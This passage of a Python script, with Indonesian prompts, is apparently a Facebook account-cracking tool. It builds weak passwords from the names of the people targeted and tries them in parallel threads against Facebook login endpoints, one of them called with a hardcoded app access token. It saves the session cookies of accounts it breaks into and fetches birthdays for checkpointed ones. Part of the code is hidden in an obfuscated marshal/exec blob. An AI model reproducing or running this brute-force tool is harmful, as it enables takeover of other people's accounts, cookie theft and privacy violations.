		input("\nTekan Enter Untuk Kembali")
		menu()
	except Exception as e:
		exit("\nBermasalah > %s"%e)

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
	return results

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crackttl:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(("\nIngin Menggunakan Sandi Manual/Otomotis [ m/o ]"))
		while True:
			f=input("\n> ")
			if f=="":continue
			elif f in["m","M"]:
				try:
					while True:
						try:
							self.apk=input("\nNama File > ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("%s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("%s"%e))
					continue
				print(("\n[ CONTOH SANDI ] sayang,pengen,ngentot"))
				self.pwlist()
				break
			elif f in["o","O"]:
				try:
					while True:
						try:
							self.apk=input("\nNama File > ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("%s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("%s"%e))
				print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input("\nSandi > ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\033[0;92mOK %s - %s               "%(fl.get("id"),i)))
					self.ada.append("%s - %s"%(fl.get("id"),i))
					if fl.get("id") in open("results.txt").read():
						break
					else:
						open("results.txt","a+").write(
						"%s - %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\033[0;91mCP %s - %s - %s   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s - %s"%(fl.get("id"),i))
					open("check.txt","a+").write(
						"%s - %s - %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
			print("\r\033[0m%s-%s \033[0;92mOK %s \033[0;91mCP %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end='');sys.stdout.flush()
		except:
			self.main(fl)

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print(("\nIngin Menggunakan Sandi Manual/Otomotis [ m/o ]"))
    while True:
      f=input("\n> ")
      if f in[""," "]:
        print(("\nSalah"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input("\nNama File > ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(("%s"%e))
              continue
          self.fl=[]
          print(("\n[ CONTOH SANDI ] sayang,pengen,ngentot"))
          self.pw=input("\nSandi > ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("%s"%e))
          continue
        print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
        ThreadPool(35).map(self.brute,self.fl)
        exit()
        break
      elif f in["o","O"]:
        try:
          while True:
            try:
              self.apk=input("\nNama File > ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print(("\nHasil OK Tersimpan Di > results.txt\nHasil CP Tersimpan Di > check.txt\n\n\t     SEMOGA BERUNTUNG\n\n"))
        ThreadPool(35).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " - " + password)
      print(("\r\033[0;92mRESULT %s - %s %s               "%(username,password,N)))
      ok.append(username + " - " + password)
      save = open("results.txt", "a")
      save.write(str(username) + " - " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " - " + ttl)
        print(("\r\033[0;91mCHECK %s - %s - %s   "%(username,password,ttl)))
        save = open("check.txt", "a+")
        save.write(str(username) + " - " + str(password) + " - "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\033[0m%s-%s \033[0;92mRESULTS %s \033[0;91mCHECK %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end='');sys.stdout.flush()        
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\033[0m%s-%s \033[0;92mRESULTS %s \033[0;91mCHECK %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end='');sys.stdout.flush()

exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00e\x01d\x00d\x01\x84\x00d\x02g\x00d\x03\xa2\x01e\x02\x83\x03\x83\x01d\x04\x83\x01\x83\x01\x01\x00d\x05S\x00)\x06c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00s\x18\x00\x00\x00|\x00\xa0\x00\x87\x00f\x01d\x01d\x02\x84\x08|\x01D\x00\x83\x01\xa1\x01S\x00)\x03Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00s\x14\x00\x00\x00g\x00|\x00]\x0c}\x01\x88\x00|\x01\x83\x01\x91\x02q\x04S\x00\xa9\x00r\x01\x00\x00\x00)\x02\xda\x02.0\xda\x03___\xa9\x01\xda\x01_r\x01\x00\x00\x00\xfa\x08<HamzaH>\xda\n<listcomp>\x04\x00\x00\x00\xf3\x00\x00\x00\x00z\x1c<lambda>.<locals>.<listcomp>)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x05\x00\x00\x00r\x01\x00\x00\x00r\x04\x00\x00\x00r\x06\x00\x00\x00\xda\x08<lambda>\x04\x00\x00\x00r\x08\x00\x00\x00r\x0c\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x0e\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x10\x00\x00\x00\xe9a\x00\x00\x00r\x13\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x17\x00\x00\x00\xe9l\x00\x00\x00r\x16\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1a\x00\x00\x00r\x12\x00\x00\x00r\x17\x00\x00\x00\xe9d\x00\x00\x00r\x18\x00\x00\x00s\xbf\t\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00e\x01d\x00d\x01\x84\x00d\x02g\x00d\x03\xa2\x01e\x02\x83\x03\x83\x01d\x04\x83\x01\x83\x01\x01\x00d\x05S\x00)\x06c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00s\x18\x00\x00\x00|\x00\xa0\x00\x87\x00f\x01d\x01d\x02\x84\x08|\x01D\x00\x83\x01\xa1\x01S\x00)\x03Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00s\x14\x00\x00\x00g\x00|\x00]\x0c}\x01\x88\x00|\x01\x83\x01\x91\x02q\x04S\x00\xa9\x00r\x01\x00\x00\x00)\x02\xda\x02.0\xda\x03___\xa9\x01\xda\x01_r\x01\x00\x00\x00\xfa\x08<HamzaH>\xda\n<listcomp>\x04\x00\x00\x00\xf3\x00\x00\x00\x00z\x1c<lambda>.<locals>.<listcomp>)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x05\x00\x00\x00r\x01\x00\x00\x00r\x04\x00\x00\x00r\x06\x00\x00\x00\xda\x08<lambda>\x04\x00\x00\x00r\x08\x00\x00\x00r\x0c\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x0e\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x10\x00\x00\x00\xe9a\x00\x00\x00r\x13\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x17\x00\x00\x00\xe9l\x00\x00\x00r\x16\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1a\x00\x00\x00r\x12\x00\x00\x00r\x17\x00\x00\x00\xe9d\x00\x00\x00r\x18\x00\x00\x00s\xac\x07\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00e\x01d\x00d\x01\x84\x00d\x02g\x00d\x03\xa2\x01e\x02\x83\x03\x83\x01d\x04\x83\x01\x83\x01\x01\x00d\x05S\x00)\x06c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00s\x18\x00\x00\x00|\x00\xa0\x00\x87\x00f\x01d\x01d\x02\x84\x08|\x01D\x00\x83\x01\xa1\x01S\x00)\x03Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00s\x14\x00\x00\x00g\x00|\x00]\x0c}\x01\x88\x00|\x01\x83\x01\x91\x02q\x04S\x00\xa9\x00r\x01\x00\x00\x00)\x02\xda\x02.0\xda\x03___\xa9\x01\xda\x01_r\x01\x00\x00\x00\xfa\x08<HamzaH>\xda\n<listcomp>\x04\x00\x00\x00\xf3\x00\x00\x00\x00z\x1c<lambda>.<locals>.<listcomp>)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x05\x00\x00\x00r\x01\x00\x00\x00r\x04\x00\x00\x00r\x06\x00\x00\x00\xda\x08<lambda>\x04\x00\x00\x00r\x08\x00\x00\x00r\x0c\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x0e\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x10\x00\x00\x00\xe9a\x00\x00\x00r\x13\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x17\x00\x00\x00\xe9l\x00\x00\x00r\x16\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1a\x00\x00\x00r\x12\x00\x00\x00r\x17\x00\x00\x00\xe9d\x00\x00\x00r\x18\x00\x00\x00s\x99\x05\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00e\x01d\x00d\x01\x84\x00d\x02g\x00d\x03\xa2\x01e\x02\x83\x03\x83\x01d\x04\x83\x01\x83\x01\x01\x00d\x05S\x00)\x06c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00s\x18\x00\x00\x00|\x00\xa0\x00\x87\x00f\x01d\x01d\x02\x84\x08|\x01D\x00\x83\x01\xa1\x01S\x00)\x03Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00s\x14\x00\x00\x00g\x00|\x00]\x0c}\x01\x88\x00|\x01\x83\x01\x91\x02q\x04S\x00\xa9\x00r\x01\x00\x00\x00)\x02\xda\x02.0\xda\x03___\xa9\x01\xda\x01_r\x01\x00\x00\x00\xfa\x08<HamzaH>\xda\n<listcomp>\x04\x00\x00\x00\xf3\x00\x00\x00\x00z\x1c<lambda>.<locals>.<listcomp>)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x05\x00\x00\x00r\x01\x00\x00\x00r\x04\x00\x00\x00r\x06\x00\x00\x00\xda\x08<lambda>\x04\x00\x00\x00r\x08\x00\x00\x00r\x0c\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x0e\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x10\x00\x00\x00\xe9a\x00\x00\x00r\x13\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x17\x00\x00\x00\xe9l\x00\x00\x00r\x16\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1a\x00\x00\x00r\x12\x00\x00\x00r\x17\x00\x00\x00\xe9d\x00\x00\x00r\x18\x00\x00\x00s\x86\x03\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00e\x01d\x00d\x01\x84\x00d\x02g\x00d\x03\xa2\x01e\x02\x83\x03\x83\x01d\x04\x83\x01\x83\x01\x01\x00d\x05S\x00)\x06c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00s\x18\x00\x00\x00|\x00\xa0\x00\x87\x00f\x01d\x01d\x02\x84\x08|\x01D\x00\x83\x01\xa1\x01S\x00)\x03Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00s\x14\x00\x00\x00g\x00|\x00]\x0c}\x01\x88\x00|\x01\x83\x01\x91\x02q\x04S\x00\xa9\x00r\x01\x00\x00\x00)\x02\xda\x02.0\xda\x03___\xa9\x01\xda\x01_r\x01\x00\x00\x00\xfa\x08<HamzaH>\xda\n<listcomp>\x04\x00\x00\x00\xf3\x00\x00\x00\x00z\x1c<lambda>.<locals>.<listcomp>)\x01\xda\x04join)\x03\xda\x04____\xda\x02__r\x05\x00\x00\x00r\x01\x00\x00\x00r\x04\x00\x00\x00r\x06\x00\x00\x00\xda\x08<lambda>\x04\x00\x00\x00r\x08\x00\x00\x00r\x0c\x00\x00\x00\xda\x00)\x1b\xe9_\x00\x00\x00r\x0e\x00\x00\x00\xe9i\x00\x00\x00\xe9m\x00\x00\x00\xe9p\x00\x00\x00\xe9o\x00\x00\x00\xe9r\x00\x00\x00\xe9t\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\xe9(\x00\x00\x00\xe9'\x00\x00\x00r\x10\x00\x00\x00\xe9a\x00\x00\x00r\x13\x00\x00\x00\xe9s\x00\x00\x00\xe9h\x00\x00\x00r\x17\x00\x00\x00\xe9l\x00\x00\x00r\x16\x00\x00\x00\xe9)\x00\x00\x00\xe9.\x00\x00\x00r\x1a\x00\x00\x00r\x12\x00\x00\x00r\x17\x00\x00\x00\xe9d\x00\x00\x00r\x18\x00\x00\x00ss\x01\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s\x0c\x00\x00\x00d\x00d\x01\x84\x00Z\x00d\x02S\x00)\x03c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00sl\x00\x00\x00t\x00|\x00\x83\x01d\x01k\x03r t\x01d\x02t\x02t\x00|\x00\x83\x01\x83\x01\x17\x00\x83\x01\x01\x00t\x00|\x01\x83\x01d\x01k\x03r@t\x01d\x03t\x02t\x00|\x01\x83\x01\x83\x01\x17\x00\x83\x01\x01\x00t\x00|\x00\x83\x01d\x01k\x02rht\x00|\x01\x83\x01d\x01k\x02rht\x01d\x04\x83\x01\x01\x00t\x01d\x05\x83\x01\x01\x00d\x00S\x00)\x06N\xe9\x00\x00\x00\x00z\x0b\nRESULTS > z\t\nCHECK > \xda\x01\nz\x10\nTidak Ada Hasil)\x03\xda\x03len\xda\x05print\xda\x03str)\x02Z\x04AnakZ\x06Kontol\xa9\x00r\x06\x00\x00\x00\xfa\x08<HamzaH>\xda\x07results\x01\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x0c\x01\x14\x01\x0c\x01\x14\x01\x18\x01\x08\x01r\x08\x00\x00\x00N)\x01r\x08\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x01\x00\x00\x00r\x01\x00\x00\x00r\x01\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x04\x00\x00\x00r\x08\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x01\x00\x00\x00r\x01\x00\x00\x00r\x01\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x04\x00\x00\x00r\x08\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x01\x00\x00\x00r\x01\x00\x00\x00r\x01\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x04\x00\x00\x00r\x08\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x01\x00\x00\x00r\x01\x00\x00\x00r\x01\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x04\x00\x00\x00r\x08\x00\x00\x00N)\x03\xda\x04exec\xda\x04eval\xda\x03chrr\x01\x00\x00\x00r\x01\x00\x00\x00r\x01\x00\x00\x00r\x06\x00\x00\x00\xda\x08<module>\x04\x00\x00\x00r\x08\x00\x00\x00"))
                
def updatesc():
	os.system("clear")
	banner()
	print(("\nMemperbarui Script"))
	os.system("git pull origin master")
	print(("\nMemperbarui Script Berhasil"))
	exit()

if __name__=="__main__":
	menu()